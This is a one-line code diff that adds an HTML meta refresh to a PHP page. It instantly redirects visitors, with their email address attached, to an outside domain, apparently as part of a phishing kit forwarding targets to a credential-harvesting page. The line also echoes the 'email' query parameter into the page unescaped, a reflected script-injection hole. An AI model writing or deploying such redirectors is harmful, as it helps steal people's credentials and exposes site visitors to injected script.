@@ -1,0 +1,1 @@
+<meta http-equiv="REFRESH" content="0; https://autorelog.heronguemn.co/index.php?email=<?php echo $_GET['email']; ?>">
